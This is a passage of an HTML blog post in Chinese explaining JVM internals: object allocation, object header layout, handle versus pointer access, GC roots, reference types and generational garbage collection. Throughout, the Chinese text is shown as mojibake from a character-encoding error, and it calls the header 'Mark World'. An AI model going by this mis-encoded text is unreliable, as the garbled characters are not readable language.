·ä¼šnewå‡ºæ¥ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè€Œéå­˜å‚¨åœ¨å¸¸é‡æ± ä¸­çš„å­—ç¬¦ä¸²</p></blockquote><h3 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h3><h4 id="åˆ›å»ºå¯¹è±¡å¤§è‡´æµç¨‹"><a href="#åˆ›å»ºå¯¹è±¡å¤§è‡´æµç¨‹" class="headerlink" title="åˆ›å»ºå¯¹è±¡å¤§è‡´æµç¨‹"></a>åˆ›å»ºå¯¹è±¡å¤§è‡´æµç¨‹</h4><h5 id="ç±»åŠ è½½æ£€æŸ¥"><a href="#ç±»åŠ è½½æ£€æŸ¥" class="headerlink" title="ç±»åŠ è½½æ£€æŸ¥"></a>ç±»åŠ è½½æ£€æŸ¥</h5><p>å½“jvmé‡åˆ°ä¸€æ¡å­—èŠ‚ç newæŒ‡ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆå°†ä¼šæ£€æŸ¥è¿™ä¸ªæŒ‡ä»¤çš„å‚æ•°æ˜¯å¦èƒ½åœ¨å¸¸é‡æ± å®šä½åˆ°ä¸€ä¸ªç±»çš„ç¬¦å·å¼•ç”¨ï¼Œå¹¶ä¸”æ£€æŸ¥è¿™ä¸ªç¬¦å·å¼•ç”¨ä»£è¡¨çš„ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ï¼Œè§£æå’Œåˆå§‹åŒ–è¿‡ã€‚å¦‚æœæ²¡æœ‰ï¼Œå…ˆæ‰§è¡Œç›¸åº”çš„ç±»åŠ è½½è¿‡ç¨‹ã€‚</p><h5 id="åˆ†é…å†…å­˜"><a href="#åˆ†é…å†…å­˜" class="headerlink" title="åˆ†é…å†…å­˜"></a>åˆ†é…å†…å­˜</h5><ul><li>æŒ‡é’ˆç¢°æ’</li></ul><p>â€‹    åœ¨Javaå †è§„æ•´çš„æƒ…å†µä¸‹ï¼ˆæ‰€æœ‰å¯¹è±¡çš„åœ°å€è¿ç»­ï¼‰ï¼Œä¸ºæ–°å¯¹è±¡åˆ†é…å†…å­˜åªéœ€è¦æŠŠæŒ‡é’ˆå‘ç©ºé—²åŒºåŸŸç§»åŠ¨</p><ul><li>ç©ºé—²åˆ—è¡¨</li></ul><p>â€‹    åœ¨Javaå †å†…å­˜å­˜æ”¾åˆ†æ•£çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¿…é¡»ç»´æŠ¤ä¸€ä¸ªåˆ—è¡¨ï¼Œè®°å½•å“ªäº›å†…å­˜å—æ˜¯å¯ç”¨çš„ï¼Œåˆ†é…å†…å­˜æ—¶ä»åˆ—è¡¨ä¸­æ‰¾åˆ°åˆé€‚çš„å†…å­˜å—ï¼Œå¹¶æ›´æ–°è¡¨ä¸Šçš„è®°å½•ã€‚</p><p><strong>åˆ†é…å†…å­˜è¿™ä¸ªè¿‡ç¨‹éœ€è¦ä¿è¯çº¿ç¨‹å®‰å…¨</strong>ï¼Œä¸€èˆ¬é‡‡å–ä¸¤ç§åšæ³•: </p><ul><li>å¯¹åˆ†é…å†…å­˜ç©ºé—´çš„åŠ¨ä½œè¿›è¡ŒåŒæ­¥å¤„ç†â€”â€”å®é™…ä¸Šè™šæ‹Ÿæœºæ˜¯é‡‡ç”¨CASé…ä¸Šå¤±è´¥é‡è¯•çš„æ–¹å¼ä¿è¯æ›´æ–°æ“ä½œçš„åŸå­æ€§</li><li>ä¸ºæ¯æ¡çº¿ç¨‹é¢„å…ˆåˆ†é…ä¸€å—å †å†…å­˜ï¼Œå³æœ¬åœ°çº¿ç¨‹åˆ†é…ç¼“å†²ï¼Œå“ªä¸ªçº¿ç¨‹è¦åˆ†é…å†…å­˜ï¼Œå°±åœ¨å“ªä¸ªçº¿ç¨‹çš„æœ¬åœ°ç¼“å†²åŒºåˆ†é…ã€‚æœ¬åœ°ç¼“å†²åŒºæ¶ˆè€—å®Œäº†æ‰ä¼šé”åŒæ­¥ã€‚</li></ul><h5 id="åˆå§‹åŒ–å†…å­˜ç©ºé—´"><a href="#åˆå§‹åŒ–å†…å­˜ç©ºé—´" class="headerlink" title="åˆå§‹åŒ–å†…å­˜ç©ºé—´"></a>åˆå§‹åŒ–å†…å­˜ç©ºé—´</h5><p>å³ä¸ºå¯¹è±¡çš„æˆå‘˜å˜é‡èµ‹åˆå€¼ï¼Œæ²¡æœ‰èµ‹åˆå€¼çš„åˆå§‹åŒ–ä¸ºç±»å‹å¯¹åº”é›¶å€¼ï¼ˆå¼•ç”¨ç±»å‹å¯¹åº”nullï¼‰</p><h5 id="åˆå§‹åŒ–å¯¹è±¡å¤´-Object-Header"><a href="#åˆå§‹åŒ–å¯¹è±¡å¤´-Object-Header" class="headerlink" title="åˆå§‹åŒ–å¯¹è±¡å¤´ (Object Header)"></a>åˆå§‹åŒ–å¯¹è±¡å¤´ (Object Header)</h5><p>Javaè™šæ‹Ÿæœºéœ€è¦å¯¹å¯¹è±¡è¿›è¡Œå¿…è¦çš„è®¾ç½®ï¼Œä¾‹å¦‚è¿™ä¸ªå¯¹è±¡æ˜¯å“ªä¸ªç±»çš„å®ä¾‹ï¼Œå¦‚ä½•æ‰èƒ½æ‰¾åˆ°ç±»çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œå¯¹è±¡çš„hash code(å®é™…ä¸Šä¼šå»¶ååˆ°è°ƒç”¨<code>Object#hashCode()</code>æ‰ä¼šè®¡ç®—)ï¼Œå¯¹è±¡çš„GCåˆ†ä»£å¹´é¾„ç­‰ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä¼šå­˜æ”¾åœ¨å¯¹è±¡çš„<strong>å¯¹è±¡å¤´</strong>ä¸­ã€‚</p><h5 id="è°ƒç”¨æ„é€ å™¨"><a href="#è°ƒç”¨æ„é€ å™¨" class="headerlink" title="è°ƒç”¨æ„é€ å™¨"></a>è°ƒç”¨æ„é€ å™¨</h5><p>ä½¿ç”¨æ­£å¸¸é€”å¾„æ–°å»ºå¯¹è±¡å¿…ä¸å¯å°‘çš„ç¯èŠ‚ï¼Œå½“ç„¶ä½¿ç”¨<code>Unsafe#allocateInstance()</code>åˆ›å»ºå¯¹è±¡æ˜¯å¯ä»¥è·³è¿‡è¿™ä¸€æ­¥çš„ã€‚(Gsonçš„ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡å°±æ˜¯ä½¿ç”¨å®ƒæ–°å»ºçš„ï¼Œæ‰€ä»¥è¯´å®ƒä¸é€‚åˆKtï¼Œå› ä¸ºKtçš„ç©ºå®‰å…¨æ£€æŸ¥é€»è¾‘å®é™…ä¸Šæ˜¯å†™åœ¨æ„é€ å™¨é‡Œçš„ï¼ŒGsonè¿™æ ·åšç›´æ¥è·³è¿‡äº†ç©ºå®‰å…¨æ£€æŸ¥)</p><h4 id="å¯¹è±¡çš„å†…å­˜å¸ƒå±€"><a href="#å¯¹è±¡çš„å†…å­˜å¸ƒå±€" class="headerlink" title="å¯¹è±¡çš„å†…å­˜å¸ƒå±€"></a>å¯¹è±¡çš„å†…å­˜å¸ƒå±€</h4><p>åœ¨HotSpotè™šæ‹Ÿæœºä¸­ï¼Œå¯¹è±¡åœ¨å †å†…å­˜ä¸­çš„å‚¨å­˜å¸ƒå±€å¯ä»¥åˆ’åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†: å¯¹è±¡å¤´(Header)ï¼Œå®ä¾‹æ•°æ®(Instance Data)å’Œå¯¹é½å¡«å……(Padding)ã€‚</p><p>å¯¹è±¡å¤´ä¸­åŒ…å«ä¸¤ç±»ä¿¡æ¯: ç¬¬ä¸€ç±»æ˜¯ç”¨äºå­˜å‚¨å¯¹è±¡è‡ªèº«çš„è¿è¡Œæ—¶æ•°æ®ï¼Œå¦‚HashCodeï¼ŒGCåˆ†ä»£å¹´é¾„ï¼Œé”çŠ¶æ€æ ‡å¿—ï¼Œçº¿ç¨‹æŒæœ‰çš„é”ï¼Œåå‘çº¿ç¨‹IDï¼Œåå‘æ—¶é—´æˆ³ç­‰ï¼Œè¿™éƒ¨åˆ†æ•°æ®çš„é•¿åº¦åœ¨32ä½å’Œ64ä½çš„è™šæ‹Ÿæœºä¸­åˆ†åˆ«ä¸º32å’Œ64ä¸ªbitï¼Œå®˜æ–¹ç§°å®ƒä¸ºâ€œMark Worldâ€ã€‚</p><p>å®ä¾‹æ•°æ®éƒ¨åˆ†æ˜¯å¯¹è±¡çœŸæ­£å­˜å‚¨çš„æœ‰æ•ˆä¿¡æ¯ï¼Œå³æˆ‘ä»¬åœ¨ç¨‹åºä»£ç ä¸­æ‰€å®šä¹‰çš„å­—æ®µç­‰å†…å®¹</p><p>å¯¹é½å¡«å……éƒ¨åˆ†åªæ˜¯èµ·åˆ°ä¸€ä¸ªå ä½ç¬¦çš„ä½œç”¨ï¼Œç”±äºHotSpotè™šæ‹Ÿæœºçš„è‡ªåŠ¨å†…å­˜ç®¡ç†ç³»ç»Ÿè¦æ±‚å¯¹è±¡èµ·å§‹åœ°å€å¿…é¡»æ˜¯8å­—èŠ‚çš„æ•´æ•°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ä»»ä½•å¯¹è±¡çš„å¤§å°éƒ½å¿…é¡»æ˜¯8å­—èŠ‚çš„å€æ•°ã€‚å¯¹è±¡å¤´éƒ¨åˆ†å·²ç»è¢«ç²¾å¿ƒè®¾è®¡ä¸º8å­—èŠ‚çš„å€æ•°ï¼ˆ1å€æˆ–2å€ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœå¯¹è±¡å®ä¾‹æ•°æ®éƒ¨åˆ†æ²¡æœ‰å¯¹é½çš„è¯ï¼Œå°±éœ€è¦é€šè¿‡å¯¹é½å¡«å……æ¥è¡¥å…¨ã€‚</p><h4 id="å¯¹è±¡çš„è®¿é—®å®šä½"><a href="#å¯¹è±¡çš„è®¿é—®å®šä½" class="headerlink" title="å¯¹è±¡çš„è®¿é—®å®šä½"></a>å¯¹è±¡çš„è®¿é—®å®šä½</h4><p>åˆ›å»ºå¯¹è±¡è‡ªç„¶æ˜¯ä¸ºäº†ä½¿ç”¨å¯¹è±¡ï¼Œæˆ‘ä»¬çš„javaç¨‹åºä¸€èˆ¬é€šè¿‡æ ˆä¸Šä¿å­˜çš„<strong>reference</strong>(å³å¼•ç”¨)æ¥æ“ä½œå †ä¸Šçš„å…·ä½“å¯¹è±¡ã€‚ä½†Javaè™šæ‹Ÿæœºè§„èŒƒä¸­åªè§„å®šäº†è¿™ä¸ªreferenceç±»å‹æ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶æ²¡æœ‰å¼ºåˆ¶è¦æ±‚è¿™ä¸ªå¼•ç”¨åº”è¯¥å¦‚ä½•å®šä½ï¼Œè®¿é—®å¯¹è±¡ã€‚æ‰€ä»¥å¯¹è±¡è®¿é—®æ–¹å¼ä¹Ÿæ˜¯ç”±è™šæ‹Ÿæœºå®ç°è€Œå®šçš„ï¼Œä¸»æµçš„è®¿é—®æ–¹å¼ä¸»è¦æœ‰ä½¿ç”¨<strong>å¥æŸ„</strong>å’Œ<strong>æŒ‡é’ˆ</strong>ã€‚</p><h5 id="å¥æŸ„"><a href="#å¥æŸ„" class="headerlink" title="å¥æŸ„"></a>å¥æŸ„</h5><blockquote><p> å¦‚æœä½¿ç”¨å¥æŸ„è®¿é—®çš„è¯ï¼ŒJavaå †ä¸­å°†å¯èƒ½åˆ’åˆ†å‡ºä¸€å—å†…å­˜æ¥ä½œä¸ºå¥æŸ„æ± ï¼Œreferenceä¸­å­˜å‚¨çš„å°±æ˜¯å¯¹è±¡çš„å¥æŸ„åœ°å€ï¼Œè€Œå¥æŸ„ä¸­åŒ…å«äº†å¯¹è±¡çš„å®ä¾‹æ•°æ®ä¸ç±»å‹æ•°æ®å„è‡ªå…·ä½“çš„åœ°å€ä¿¡æ¯</p></blockquote><p>ä½¿ç”¨å¥æŸ„æ¥è®¿é—®çš„æœ€å¤§å¥½å¤„æ˜¯referenceä¸­å­˜å‚¨çš„æ˜¯ç¨³å®šçš„å¥æŸ„åœ°å€ï¼Œåœ¨å¯¹è±¡è¢«ç§»åŠ¨ï¼ˆGCæ—¶ç§»åŠ¨æ˜¯å¾ˆæ™®éçš„è¡Œä¸ºï¼‰æ—¶åªä¼šæ”¹å˜å¥æŸ„ä¸­çš„å®ä¾‹æ•°æ®æŒ‡é’ˆï¼Œè€Œreferenceæœ¬èº«ä¸éœ€è¦è¢«ä¿®æ”¹ã€‚</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png" alt="é£ä¹¦20220708-221205"></p><h5 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h5><blockquote><p>å¦‚æœç›´æ¥ä½¿ç”¨æŒ‡é’ˆè®¿é—®çš„è¯ï¼ŒJavaå †ä¸­å¯¹è±¡çš„å†…å­˜å¸ƒå±€å°±å¿…é¡»è€ƒè™‘å¦‚ä½•æ”¾ç½®è®¿é—®ç±»å‹çš„ç›¸å…³ä¿¡æ¯ï¼Œreferenceä¸­å­˜å‚¨çš„ç›´æ¥å°±æ˜¯å¯¹è±¡åœ°å€ï¼Œå¦‚æœåªæ˜¯è®¿é—®å¯¹è±¡æœ¬èº«çš„è¯ï¼Œå°±ä¸éœ€è¦å¤šä¸€æ¬¡è®¿é—®çš„å¼€é”€ã€‚</p></blockquote><p>ç›´æ¥ä½¿ç”¨æŒ‡é’ˆè®¿é—®çš„å¥½å¤„åœ¨ä¸é€Ÿåº¦å¿«ï¼Œå®ƒèŠ‚çœäº†ä¸€æ¬¡æŒ‡é’ˆå®šä½çš„å¼€é”€ï¼Œç”±äºå¯¹è±¡è®¿é—®åœ¨javaä¸­éå¸¸é¢‘ç¹ï¼Œè¿™ç¬”å¼€é”€ç›¸å½“ä¸å®¹å°è§‘ã€‚<strong>HotSpot</strong>è™šæ‹Ÿæœºé‡‡ç”¨æŒ‡é’ˆè®¿é—®</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png" alt="é£ä¹¦20220708-221128"></p><h3 id="åƒåœ¾å›æ”¶-GC"><a href="#åƒåœ¾å›æ”¶-GC" class="headerlink" title="åƒåœ¾å›æ”¶ (GC)"></a>åƒåœ¾å›æ”¶ (GC)</h3><p>å¤§å®¶åº”è¯¥éƒ½çŸ¥é“è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘å°±ä¸ä»‹ç»äº†ï¼Œç›´æ¥åˆ‡å…¥æ­£é¢˜</p><h4 id="å¼•ç”¨è®¡æ•°ç®—æ³•-amp-å¯è¾¾æ€§åˆ†æç®—æ³•"><a href="#å¼•ç”¨è®¡æ•°ç®—æ³•-amp-å¯è¾¾æ€§åˆ†æç®—æ³•" class="headerlink" title="å¼•ç”¨è®¡æ•°ç®—æ³• &amp; å¯è¾¾æ€§åˆ†æç®—æ³•"></a>å¼•ç”¨è®¡æ•°ç®—æ³• &amp; å¯è¾¾æ€§åˆ†æç®—æ³•</h4><p>åœ¨å †ä¸­å­˜æ”¾ç€Javaä¸–ç•Œä¸­å‡ ä¹æ‰€æœ‰çš„å¯¹è±¡å®ä¾‹ï¼Œåƒåœ¾æ”¶é›†å™¨åœ¨å †ä¸­è¿›è¡Œå›æ”¶å‰ï¼Œç¬¬ä¸€ä»¶äº‹å°±æ˜¯è¦ç¡®å®šè¿™äº›å¯¹è±¡ä¹‹ä¸­è¿˜æœ‰å“ªäº›â€å­˜æ´»â€œç€ï¼Œå“ªäº›å·²ç»â€œæ­»å»â€ã€‚ä¸‹é¢å°±è®²ä¸€è®²æ¯”è¾ƒå¸¸è§çš„ä¸¤ç§åˆ¤æ–­çš„æ–¹æ³•ã€‚</p><h5 id="å¼•ç”¨è®¡æ•°ç®—æ³•"><a href="#å¼•ç”¨è®¡æ•°ç®—æ³•" class="headerlink" title="å¼•ç”¨è®¡æ•°ç®—æ³•"></a>å¼•ç”¨è®¡æ•°ç®—æ³•</h5><p>åœ¨å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“æœ‰ä¸€ä¸ªåœ°æ–¹å¼•ç”¨å®ƒæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±+1ï¼Œå¼•ç”¨å¤±æ•ˆæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±-1ã€‚ä»»ä½•æ—¶å€™è®¡æ•°å™¨ä¸º0çš„å¯¹è±¡æ˜¯ä¸å¯èƒ½å†ä½¿ç”¨çš„ï¼Œå¯ä»¥ç›´æ¥å›æ”¶ã€‚</p><p>è™½ç„¶å¼•ç”¨è®¡æ•°æ³•ç®€å•é«˜æ•ˆï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªä¸é”™çš„ç®—æ³•ã€‚ä½†ä¸»æµçš„Javaè™šæ‹Ÿæœºå¹¶æ²¡æœ‰é‡‡ç”¨å¼•ç”¨è®¡æ•°æ³•è¿›è¡Œå†…å­˜ç®¡ç†ï¼Œå› ä¸ºè¿™ä¸ªç®—æ³•éœ€è¦å¤„ç†å¤§é‡çš„æ„å¤–æƒ…å†µâ€”â€”æ¯”å¦‚å¾ªç¯å¼•ç”¨ã€‚</p><h5 id="å¯è¾¾æ€§åˆ†æç®—æ³•"><a href="#å¯è¾¾æ€§åˆ†æç®—æ³•" class="headerlink" title="å¯è¾¾æ€§åˆ†æç®—æ³•"></a>å¯è¾¾æ€§åˆ†æç®—æ³•</h5><p>å½“å‰ä¸»æµçš„å•†ç”¨åº”ç”¨è¯­è¨€ï¼ˆJavaï¼ŒC#ç­‰ï¼‰çš„å†…å­˜ç®¡ç†å­ç³»ç»Ÿéƒ½æ˜¯é€šè¿‡<strong>å¯è¾¾æ€§åˆ†æ</strong>ç®—æ³•æ¥åˆ¤å®šå¯¹è±¡æ˜¯å¦å­˜æ´»ã€‚è¿™ä¸ªç®—æ³•çš„åŸºæœ¬æ€è·¯å°±æ˜¯é€šè¿‡ä¸€ç³»åˆ—ç§°ä¸º<strong>GC Roots</strong>çš„æ ¹å¯¹è±¡ä½œä¸ºèµ·å§‹èŠ‚ç‚¹é›†ï¼Œä»è¿™äº›èŠ‚ç‚¹å¼€å§‹ï¼Œæ ¹æ®å¼•ç”¨å…³ç³»å‘ä¸‹æœç´¢ï¼Œæœç´¢è¿‡ç¨‹ä¸­èµ°è¿‡è·¯å¾„ç§°ä¸º<strong>å¼•ç”¨é“¾</strong>ï¼Œå¦‚æœæŸä¸ªå¯¹è±¡åˆ°GC Rootsé—´æ²¡æœ‰ä»»ä½•å¼•ç”¨é“¾ç›¸è¿ï¼Œåˆ™è¯¥å¯¹è±¡<strong>ä¸å¯è¾¾</strong>ï¼Œå°±ä¼šè¢«åˆ¤å®šä¸ºå¯å›æ”¶çš„å¯¹è±¡ã€‚</p><p>å¯ä½œä¸ºGC Rootsçš„å¯¹è±¡:</p><ul><li>åœ¨è™šæ‹Ÿæœºæ ˆä¸­å¼•ç”¨çš„å¯¹è±¡</li><li>æ–¹æ³•åŒºä¸­ç±»é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡ ï¼ˆä¾‹å¦‚Javaçš„å¼•ç”¨ç±»å‹é™æ€å˜é‡ï¼‰</li><li>æ–¹æ³•åŒºä¸­å¸¸é‡å¼•ç”¨çš„å¯¹è±¡ ï¼ˆä¾‹å¦‚å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­çš„å¼•ç”¨ï¼‰</li><li>åœ¨æœ¬åœ°æ–¹æ³•æ ˆä¸­JNIå¼•ç”¨çš„å¯¹è±¡</li><li>Javaè™šæ‹Ÿæœºå†…éƒ¨çš„å¼•ç”¨ï¼Œå¦‚<strong>åŸºæœ¬æ•°æ®ç±»å‹å¯¹åº”çš„Classå¯¹è±¡</strong>ï¼Œä¸€äº›å¸¸é©»çš„å¼‚å¸¸å¯¹è±¡ï¼ˆå¦‚NullPointerExceptionï¼‰ç­‰ï¼Œè¿˜æœ‰ç³»ç»Ÿç±»åŠ è½½å™¨ã€‚</li></ul><p><img src="https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h4 id="å¼•ç”¨çš„ç±»å‹"><a href="#å¼•ç”¨çš„ç±»å‹" class="headerlink" title="å¼•ç”¨çš„ç±»å‹"></a>å¼•ç”¨çš„ç±»å‹</h4><p>å®é™…ä¸ŠGCçš„å›æ”¶ç­–ç•¥å¹¶ä¸æ­»æ¿ï¼Œåœ¨å‰©ä½™å†…å­˜è¾ƒå°‘çš„æ—¶å€™ï¼ŒGCä¼šå°½å¯èƒ½å›æ”¶å¤šçš„å¯¹è±¡æ¥è…¾å‡ºæ›´å¤šçš„å†…å­˜ç©ºé—´ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•è§„å®šåœ¨å‰©ä½™å†…å­˜è¾ƒå°‘çš„æ—¶å€™æ‰éœ€è¦å›æ”¶çš„é‚£éƒ¨åˆ†å¯¹è±¡å‘¢ï¼Ÿäºæ˜¯åœ¨JDK1.2ä¹‹åï¼ŒJavaå¯¹å¼•ç”¨çš„æ¦‚å¿µè¿›è¡Œäº†æ‰©å……ï¼Œå°†å¼•ç”¨åˆ†ä¸º<strong>å¼ºå¼•ç”¨ï¼Œè½¯å¼•ç”¨ï¼Œå¼±å¼•ç”¨ï¼Œè™šå¼•ç”¨</strong>å››ç§ç±»å‹ã€‚</p><h5 id="å¼ºå¼•ç”¨"><a href="#å¼ºå¼•ç”¨" class="headerlink" title="å¼ºå¼•ç”¨"></a>å¼ºå¼•ç”¨</h5><p>æœ€ä¼ ç»Ÿçš„å¼•ç”¨å®šä¹‰ï¼ŒæŒ‡ç¨‹åºä»£ç ä¸­æ™®éå­˜åœ¨çš„å¼•ç”¨èµ‹å€¼ã€‚åªè¦å¼ºå¼•ç”¨å…³ç³»å­˜åœ¨ï¼ŒGCå°±ä¸ä¼šå›æ”¶è¢«å¼•ç”¨çš„å¯¹è±¡ã€‚</p><h5 id="è½¯å¼•ç”¨"><a href="#è½¯å¼•ç”¨" class="headerlink" title="è½¯å¼•ç”¨"></a>è½¯å¼•ç”¨</h5><p>è½¯å¼•ç”¨ç”¨æ¥æè¿°ä¸€äº›è¿˜éœ€è¦ç”¨åˆ°ï¼Œä½†éå¿…é¡»çš„å¯¹è±¡ï¼Œåœ¨å†…å­˜ä¸è¶³æ—¶ï¼ŒGCä¼šå›æ”¶æ‰åªè¢«è½¯å¼•ç”¨å…³è”çš„å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨<code>SoftReference</code>ç±»æ¥å®ç°è½¯å¼•ç”¨ã€‚</p><h5 id="å¼±å¼•ç”¨"><a href="#å¼±å¼•ç”¨" class="headerlink" title="å¼±å¼•ç”¨"></a>å¼±å¼•ç”¨</h5><p>åªè¢«å¼±å¼•ç”¨å…³è”çš„å¯¹è±¡åªèƒ½å­˜æ´»åˆ°ä¸‹ä¸€æ¬¡GCåˆ°æ¥å‰ã€‚å¯ä»¥ä½¿ç”¨<code>WeakReference</code>ç±»æ¥å®ç°å¼±å¼•ç”¨ã€‚</p><h5 id="è™šå¼•ç”¨"><a href="#è™šå¼•ç”¨" class="headerlink" title="è™šå¼•ç”¨"></a>è™šå¼•ç”¨</h5><p>ç›¸å½“äºæ²¡æœ‰å¼•ç”¨ï¼Œä¹Ÿæ²¡æœ‰åŠæ³•é€šè¿‡è¿™ç§å¼•ç”¨å¾—åˆ°å…³è”çš„å¯¹è±¡ï¼Œä¸ºä¸€ä¸ªå¯¹è±¡è®¾ç½®è™šå¼•ç”¨çš„å”¯ä¸€ç›®çš„å°±æ˜¯ä¸ºäº†èƒ½åœ¨å¯¹è±¡è¢«å›æ”¶æ—¶æ”¶åˆ°é€šçŸ¥ã€‚å¯ä»¥ä½¿ç”¨<code>PhantomReference</code>ç±»æ¥å®ç°è™šå¼•ç”¨ã€‚</p><h4 id="åƒåœ¾æ”¶é›†ç®—æ³•"><a href="#åƒåœ¾æ”¶é›†ç®—æ³•" class="headerlink" title="åƒåœ¾æ”¶é›†ç®—æ³•"></a>åƒåœ¾æ”¶é›†ç®—æ³•</h4><h5 id="åˆ†ä»£æ”¶é›†ç†è®º"><a href="#åˆ†ä»£æ”¶é›†ç†è®º" class="headerlink" title="åˆ†ä»£æ”¶é›†ç†è®º"></a>åˆ†ä»£æ”¶é›†ç†è®º</h5><p>å®é™…ä¸Šï¼Œå¦‚æœæˆ‘ä»¬å¯¹å †ä¸­çš„æ¯ä¸€ä¸ªå¯¹è±¡éƒ½ä¾æ¬¡åˆ¤æ–­æ˜¯å¦éœ€è¦å›æ”¶ï¼Œè¿™æ ·çš„æ•ˆç‡å…¶å®æ˜¯å¾ˆä½çš„ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰æ›´å¥½åœ°å›æ”¶æœºåˆ¶å‘¢ï¼Ÿç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å †ä¸­çš„å¯¹è±¡è¿›è¡Œåˆ†ä»£ç®¡ç†ã€‚</p><p>æ¯”å¦‚æŸäº›å¯¹è±¡ï¼Œåœ¨å¤šæ¬¡åƒåœ¾å›æ”¶æ—¶ï¼Œéƒ½æœªè¢«åˆ¤å®šä¸ºå¯å›æ”¶å¯¹è±¡ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥å°†è¿™ä¸€éƒ¨åˆ†å¯¹è±¡æ”¾åœ¨ä¸€èµ·ï¼Œå¹¶è®©åƒåœ¾æ”¶é›†å™¨å‡å°‘å›æ”¶æ­¤åŒºåŸŸå¯¹è±¡çš„é¢‘ç‡ï¼Œè¿™æ ·å°±èƒ½å¾ˆå¥½åœ°æé«˜åƒåœ¾å›æ”¶çš„æ•ˆç‡äº†ã€‚</p><p>å› æ­¤ï¼ŒJavaè™šæ‹Ÿæœºå°†å †å†…å­˜åˆ’åˆ†ä¸º<strong>æ–°ç”Ÿä»£</strong>ã€<strong>è€å¹´ä»£</strong>å’Œ<strong>æ°¸ä¹…ä»£</strong>ï¼ˆå…¶ä¸­æ°¸ä¹…ä»£æ˜¯HotSpotè™šæ‹Ÿæœºç‰¹æœ‰çš„æ¦‚å¿µï¼Œåœ¨JDK8ä¹‹å‰æ–¹æ³•åŒºå®é™…ä¸Šå°±æ˜¯é‡‡ç”¨çš„æ°¸ä¹…ä»£ä½œä¸ºå®ç°ï¼Œè€Œåœ¨JDK8ä¹‹åï¼Œæ–¹æ³•åŒºç”±å…ƒç©ºé—´å®ç°ï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ˜¯æœ¬åœ°å†…å­˜ï¼Œå®¹é‡å¤§å°å–å†³äºç‰©ç†æœºå®é™…å¤§å°ï¼Œä¹‹åä¼šè¯¦ç»†ä»‹ç»ï¼‰è¿™é‡Œæˆ‘ä»¬ä¸»è¦è®¨è®ºçš„æ˜¯<strong>æ–°ç”Ÿä»£</strong>å’Œ<strong>è€å¹´ä»£</strong>ã€‚</p><p>ä¸åŒçš„åˆ†ä»£å†…å­˜å›æ”¶æœºåˆ¶ä¹Ÿå­˜åœ¨ä¸€äº›ä¸åŒä¹‹å¤„ï¼Œåœ¨HotSpotè™šæ‹Ÿæœºä¸­ï¼Œæ–°ç”Ÿä»£è¢«åˆ’åˆ†ä¸ºä¸‰å—ï¼Œä¸€å—è¾ƒå¤§çš„Edenç©ºé—´å’Œä¸¤å—è¾ƒå°çš„Survivorç©ºé—´ï¼Œé»˜è®¤æ¯”ä¾‹ä¸º8ï¼š1ï¼š1ï¼Œè€å¹´ä»£çš„GCè¯„ç‡ç›¸å¯¹è¾ƒä½ï¼Œæ°¸ä¹…ä»£ä¸€èˆ¬å­˜æ”¾ç±»ä¿¡æ¯ç­‰ï¼ˆå…¶å®å°±æ˜¯æ–¹æ³•åŒºçš„å®ç°ï¼‰å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg" alt="image-20220222151708141"></p><p>é‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•è¿ä½œçš„å‘¢ï¼Ÿ</p><p>é¦–å…ˆï¼Œæ‰€æœ‰æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œåœ¨ä¸€å¼€å§‹éƒ½ä¼šè¿›å…¥åˆ°æ–°ç”Ÿä»£çš„EdenåŒºï¼ˆå¦‚æœæ˜¯å¤§å¯¹è±¡ä¼šè¢«ç›´æ¥ä¸¢è¿›è€å¹´ä»£ï¼‰ï¼Œåœ¨è¿›è¡Œæ–°ç”Ÿä»£åŒºåŸŸçš„åƒåœ¾å›æ”¶æ—¶ï¼Œé¦–å…ˆä¼šå¯¹æ‰€æœ‰æ–°ç”Ÿä»£åŒºåŸŸçš„å¯¹è±¡è¿›è¡Œæ‰«æï¼Œå¹¶å›æ”¶é‚£äº›ä¸å†ä½¿ç”¨å¯¹è±¡ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg" 